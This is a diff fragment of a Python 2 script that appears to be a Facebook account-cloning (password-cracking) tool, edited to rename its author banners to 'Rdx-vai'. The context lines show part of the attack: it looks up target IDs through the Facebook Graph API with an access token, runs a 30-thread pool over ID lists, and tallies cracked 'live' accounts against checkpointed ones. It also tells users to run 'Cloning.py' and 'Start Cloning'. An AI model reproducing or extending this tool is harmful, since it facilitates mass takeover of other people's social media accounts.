+	print "\033[1;97m•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•\033[1;97mRdx-vai\033[1;97m•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•"
+	print "  \033[1;97m«---•◈•---Developed By Rdx-vai--•◈•---»" #Dev:Rdx-vai
 	print '\033[1;97mProcess Has Been Completed Press➡ Type 0 Enter↩ Next Type 0 (logout)↩\033[1;97m....'
         print '\033[1;97mNext Type (python2 Cloning.py) Next login facebook Start Cloning\033[1;97m....'
 	print"\033[1;97mTotal Live/\x1b[1;91mError \033[1;97m: \033[1;97m"+str(len(oks))+"\033[1;97m/\033[1;97m"+str(len(cekpoint))
@@ -13369,10 +13369,10 @@ def pilih_isi():
 Don't Worry Your Error ID Will Be Open After 7 Days 
 
 •\033[1;97m◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•.
-: \033[1;97m .....Tech-Aahil....... \033[1;97m :
+: \033[1;97m .....Rdx-vai....... \033[1;97m :
 •\033[1;97m◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•.' 
                 Facebook
-              \033[1;97m Aahil"""
+              \033[1;97m Rdx-vai"""
 	
 	raw_input("\n\033[1;97m[\033[1;97mBack\033[1;97m]")
 	crack()
@@ -13403,7 +13403,7 @@ def pilih_army():
 		os.system('clear')
 		print logo3
 		jjj = raw_input("\033[1;97m[•◈•] \033[1;97mEnter ID\033[1;97m: \033[1;97m")
-		print "\033[1;97m•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•\033[1;97mTech-Aahil\033[1;97m•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•"
+		print "\033[1;97m•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•\033[1;97mRdx-vai\033[1;97m•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•"
 		try:
 			gg = requests.get("https://graph.facebook.com/"+jjj+"?access_token="+toket)
 			hh = json.loads(gg.text)
@@ -13572,8 +13572,8 @@ def pilih_army():
 		
 	p = ThreadPool(30)
 	p.map(main, id)
-	print "\033[1;97m•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•\033[1;97mTech-Aahil\033[1;97m•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•"
-	print "  \033[1;97m«---•◈•---Developed By love-Hacker--•◈•---»" #Dev:Jackroo-eng
+	print "\033[1;97m•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•\033[1;97mRdx-vai\033[1;97m•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•"
+	print "  \033[1;97m«---•◈•---Developed By Rdx-vai--•◈•---»" #Dev:Jackroo-eng
 	print '\033[1;97mProcess Has Been Completed Press➡ Type 0 Enter↩ Next Type 0 (logout)↩\033[1;97m....'
         print '\033[1;97mNext Type (python2 Cloning.py) Next login facebook Start Cloning\033[1;97m....'
 	print"\033[1;97mTotal Live/\x1b[1;91mError \033[1;97m: \033[1;97m"+str(len(oks))+"\033[1;97m/\033[1;97m"+str(len(cekpoint))
